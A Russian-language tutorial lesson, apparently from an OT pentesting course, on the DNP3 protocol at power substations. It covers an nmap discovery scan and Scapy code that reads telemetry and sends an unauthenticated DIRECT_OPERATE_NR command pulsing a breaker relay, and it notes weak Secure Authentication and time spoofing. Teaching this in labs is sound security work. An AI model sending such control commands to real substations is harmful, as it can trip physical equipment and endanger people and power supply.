## Вопрос, с которого всё начинается

В прошлом уроке мы разбирали Modbus — простой регистровый протокол. Но подстанция, которая питает целый район, на Modbus не работает: энергетикам нужно, чтобы удалённый терминал сам присылал события, ставил метки времени и умел приоритизировать данные. Для этого придумали отдельный протокол — **DNP3** (Distributed Network Protocol 3).

Вопрос урока: как, оказавшись в OT-сети, найти DNP3-устройства, прочитать их телеметрию и понять, можно ли ими управлять без пароля?

## Наш пример: подстанция в сети 10.0.0.0/24

У нас есть сегмент `10.0.0.0/24` с SCADA-сервером и удалёнными терминалами. Мы уже знаем из прошлых уроков, что Modbus — это порт 502. DNP3 обычно живёт на порту **20000**. Начнём с простого: посмотрим, кто слушает.

```bash
$ nmap -p 20000 --script dnp3-info 10.0.0.0/24
Nmap scan report for 10.0.0.10
PORT      STATE SERVICE
20000/tcp open  dnp3
| dnp3-info:
|   Source Address: 1
|   Destination Address: 10
|_  Function Code: 129 (Response)
```

Здесь мы впервые видим два ключевых слова DNP3. **Master** — это главная станция (наша SCADA), она спрашивает. **Outstation** — удалённый терминал на объекте, он отвечает. В выводе `Source Address: 1` — это адрес того, кто ответил, а `Destination Address: 10` — кому. То есть перед нами outstation с адресом **10**, а master в сети имеет адрес **1**. Запомним эти числа: они понадобятся.

## Шаг 1: зачем нужен отдельный протокол

Modbus — это просто таблица регистров. DNP3 добавляет то, что критично для энергетики:

- **События (events)** — outstation сам присылает изменение, не дожидаясь опроса.
- **Метки времени** — для разбора аварий: что сработало раньше, что позже.
- **Классы данных (Class 0–3)** — приоритет опроса: статика, важные события, второстепенные.
- **Подтверждения и повторы** — надёжность на плохих каналах (радио, PLC).
- **Коды качества (quality flags)** — «значение достоверно / устарело / недостоверно».

Чем больше возможностей — тем больше поверхность атаки. Именно поэтому DNP3 — любимый объект пентестера OT.

## Шаг 2: как устроен кадр

DNP3 состоит из трёх уровней. Не нужно запоминать их все — важно понять, где что лежит:

| Уровень | Что делает | Поля |
|---------|-----------|------|
| Data Link | кадрирование, CRC, адресация | START `0x0564`, LEN, CTRL, DEST, SRC, CRC |
| Transport | сегментация/сборка | FIR, FIN, SEQ |
| Application | функции и объекты | APP CTRL, FC, IIN, объекты |

Два адреса из Data Link — это те самые `1` и `10`. Если ошибиться в адресе назначения, команда уйдёт не тому устройству.

## Шаг 3: что именно можно прочитать

DNP3 описывает данные как **объекты** с номером **группы** (тип данных) и **вариацией** (формат). Несколько групп для ориентира:

| Группа | Тип данных |
|--------|-----------|
| 1 | Binary Input — двухпозиционный вход (вкл/выкл) |
| 10 / 12 | Binary Output — команда управления |
| 30 | Analog Input — аналоговый вход (уровень, напряжение) |
| 40 | Analog Output — аналоговая уставка |
| 50 | Time and Date |
| 60 | Class objects — запрос всех классов сразу |

А **Function Code (FC)** — это глагол: что сделать с объектами. Самые важные:

| FC | Имя | Смысл |
|----|-----|-------|
| 1 | READ | прочитать объекты |
| 3 | SELECT | «выбрать» перед управлением |
| 4 | OPERATE | выполнить после SELECT |
| 5 | DIRECT_OPERATE | выполнить сразу, без SELECT |
| 6 | DIRECT_OPERATE_NR | выполнить сразу и не ждать подтверждения |
| 129 | RESPONSE | ответ |

`DIRECT_OPERATE` (5) и `DIRECT_OPERATE_NR` (6) — самое интересное: ими открывают и закрывают выключатели.

## Шаг 4: читаем телеметрию через Scapy

Scapy — библиотека для ручного формирования сетевых пакетов; если не знаком, смотри прошлый урок по Modbus, там тот же принцип. Шлём запрос класса 0 (все статические данные):

```python
from scapy.all import *
from scapy.contrib.dnp3 import *

req = (DNP3(src=1, dst=10)/
       DNP3Application(fc=1)/
       DNP3Obj(group=60, variation=1, prefix=0, count=1))
sr1(req)
```

В ответ приходит живая телеметрия подстанции:

```text
DNP3 / TCP 10.0.0.10 -> 10.0.0.5
  Function Code: RESPONSE (129)
  IIN: 0x0000
  Object: Group 30 Var 1 (Analog Input, 32-bit, flags)  Count=4
    [0] Value=234.5 Flags=0x01 (ONLINE)
    [1] Value=0.0   Flags=0x01
    [2] Value=12.75 Flags=0x01
    [3] Value=48.0  Flags=0x01
```

Мы прочитали четыре аналоговых входа. `Flags=0x01` означает `ONLINE` — значение достоверно. `IIN: 0x0000` — outstation здоров и не занят.

## Шаг 5: IIN — «приборная панель» устройства

**IIN** (Internal Indications) — два байта в каждом ответе, состояние outstation. Читать их нужно, чтобы не наделать глупостей:

| Бит | Имя | Значение |
|-----|-----|----------|
| IIN1.5 | LOCAL_CONTROL | включено местное управление |
| IIN1.4 | NEED_TIME | время не синхронизировано |
| IIN1.7 | DEVICE_RESTART | устройство перезапускалось |
| IIN2.0 | NO_FUNC_CODE_SUPPORT | функция не поддержана |

`LOCAL_CONTROL` — критично: если он установлен, outstation **игнорирует команды управления из сети**. Оператор на объекте физически перевёл переключатель в «местное». Если этого не заметить, покажется, что «атака не работает».

## Шаг 6: можно ли управлять?

Проверяем самое главное — принимает ли outstation команды без аутентификации. Наш объект — выключатель (группа 12, Binary Output), команда `DIRECT_OPERATE_NR` (FC=6) выполняется сразу:

```python
operate = (DNP3(src=1, dst=10)/
           DNP3Application(fc=6)/
           DNP3Obj(group=12, variation=1, prefix=0, count=1)/
           DNP3CROB(control=0x41, count=1, on_time=1000, off_time=0))
sr1(operate)
```

`control=0x41` — код «PULSE ON» (импульс включения). В лаборатории такой запрос сработает и щёлкнет реле. **На реальном объекте это меняет физический процесс, поэтому выполнять только с письменным разрешением.**

## Secure DNP3: почему защиты часто нет

В DNP3 встроена аутентификация — **Secure Authentication**: `SAv2` (HMAC-SHA-1) и `SAv5` (строже, обязательна для новых развёртываний). Она делает challenge-response на критичные операции. На практике:

- SA включают редко — производитель по умолчанию оставляет выключенной.
- Ключи бывают дефолтные или лежат открыто в конфиге.
- Переходный период даёт даунгрейд-атаки.

Признак включённой SA — кадры `AUTHENTICATE_REQ` в трафике. В Wireshark: фильтр `dnp3.al.func == 32`.

## Что мы теперь знаем

1. DNP3 живёт на порту 20000; `master` спрашивает, `outstation` отвечает, у каждого свой адрес.
2. Объекты адресуются «группа + вариация», действие задаёт Function Code.
3. `DIRECT_OPERATE` (5/6) выполняет команду сразу — без SELECT и без пароля, если SA выключена.
4. IIN — состояние устройства; `LOCAL_CONTROL` блокирует удалённое управление.
5. Secure DNP3 существует, но включён редко — это и есть главный риск.

## На что смотреть дальше

- **`LOCAL_CONTROL` установлен.** Команды не пройдут — это не поломка, а физический переключатель на объекте.
- **Ответ приходит несколькими кадрами (FIR/FIN).** Не парсите первый кадр как полный: это **fragmenting**.
- **`Unsolicited responses`.** Outstation сам шлёт события — при пассивном анализе не путайте их с ответом на свой запрос.
- **`NEED_TIME` + запись времени (группа 50).** Спуфинг времени ломает разбор аварий — тихая, но опасная атака.
- **Несколько master'ов на один outstation.** Соединения конфликтуют; ваш скрипт может «сломать» легитимный опрос.

## Куда дальше

DNP3 — «серийный» протокол. В следующем уроке перейдём на промышленный Ethernet: PROFINET и EtherNet/IP, где команды летят по обычному TCP, а устройства по-прежнему доверяют любому, кто говорит на правильном протоколе. А пока главное: **DNP3 без Secure Authentication — это открытая телеметрия, которой можно не только читать, но и управлять.**
